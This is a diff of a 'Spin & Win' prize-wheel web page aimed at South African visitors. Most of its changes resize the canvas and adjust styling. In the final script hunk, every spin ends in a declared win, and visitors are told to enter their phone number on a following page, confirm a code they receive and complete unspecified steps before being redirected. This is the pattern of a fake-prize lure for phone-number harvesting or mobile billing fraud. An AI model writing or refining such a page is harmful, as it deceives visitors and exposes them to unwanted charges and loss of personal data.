@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>Spin & Win - South Africa</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -14,12 +15,16 @@
     h1 {
       color: #2c3e50;
       margin-top: 30px;
+      font-size: 22px;
+      padding: 0 10px;
     }
     #wheelContainer {
       position: relative;
-      margin: 30px auto;
-      width: 360px;
-      height: 360px;
+      margin: 20px auto;
+      width: 95vw;
+      max-width: 400px;
+      height: 95vw;
+      max-height: 400px;
     }
     #wheel {
       width: 100%;
@@ -48,27 +53,27 @@
       border: none;
       border-radius: 6px;
       cursor: pointer;
-      margin-top: 20px;
+      margin-top: 15px;
     }
     #spinBtn:hover {
       background-color: #1c669d;
     }
     #result {
       margin-top: 20px;
-      font-size: 22px;
+      font-size: 18px;
       font-weight: bold;
       color: #27ae60;
-      min-height: 30px;
+      padding: 0 15px;
     }
   </style>
 </head>
 <body>
 
-  <h1>🎉 Spin & Win in South Africa!</h1>
+  <h1>🎉 Spin & Win Amazing Prizes in South Africa!</h1>
 
   <div id="wheelContainer">
     <div id="pointer"></div>
-    <canvas id="wheel" width="360" height="360"></canvas>
+    <canvas id="wheel"></canvas>
   </div>
 
   <button id="spinBtn">Spin Now 🔄</button>
@@ -80,6 +85,8 @@
 
   <script>
     const canvas = document.getElementById("wheel");
+    canvas.width = canvas.clientWidth;
+    canvas.height = canvas.clientHeight;
     const ctx = canvas.getContext("2d");
     const spinBtn = document.getElementById("spinBtn");
     const resultTxt = document.getElementById("result");
@@ -105,17 +112,17 @@
 
         ctx.beginPath();
         ctx.fillStyle = colors[i];
-        ctx.moveTo(180, 180);
-        ctx.arc(180, 180, 180, start, end);
+        ctx.moveTo(canvas.width/2, canvas.height/2);
+        ctx.arc(canvas.width/2, canvas.height/2, canvas.width/2, start, end);
         ctx.fill();
 
         ctx.save();
-        ctx.translate(180, 180);
+        ctx.translate(canvas.width/2, canvas.height/2);
         ctx.rotate(start + arc / 2);
         ctx.textAlign = "center";
         ctx.fillStyle = "#ffffff";
         ctx.font = "bold 16px Arial";
-        ctx.fillText(prizes[i], 100, 10);
+        ctx.fillText(prizes[i], canvas.width/3, 10);
         ctx.restore();
       }
     }
@@ -124,12 +131,12 @@
 
     spinBtn.addEventListener("click", () => {
       spinBtn.disabled = true;
-      resultTxt.textContent = "⏳ Spinning...";
+      resultTxt.innerText = "⏳ Spinning the wheel...";
       spinSound.currentTime = 0;
       spinSound.play();
 
       const randomSpin = Math.floor(Math.random() * prizes.length);
-      const spins = 6;
+      const spins = 5;
       const degreesPerSegment = 360 / prizes.length;
       const finalAngle = (spins * 360) + (randomSpin * degreesPerSegment) + (degreesPerSegment / 2);
 
@@ -137,12 +144,17 @@
       canvas.style.transform = `rotate(${finalAngle}deg)`;
 
       setTimeout(() => {
-        resultTxt.textContent = `🎁 You won: ${prizes[randomSpin]}!`;
-        setTimeout(() => window.location.href = redirectURL, 2500);
+        resultTxt.innerHTML = `
+          🎉 You won: <strong>${prizes[randomSpin]}</strong>!<br><br>
+          📝 <strong>To claim your prize:</strong><br>
+          1️⃣ Enter your phone number on the next page<br>
+          2️⃣ Confirm the code you receive<br>
+          3️⃣ Complete the required steps to unlock your reward ✅
+        `;
+        setTimeout(() => window.location.href = redirectURL, 4000);
       }, 5200);
     });
   </script>
 
 </body>
 </html>
-
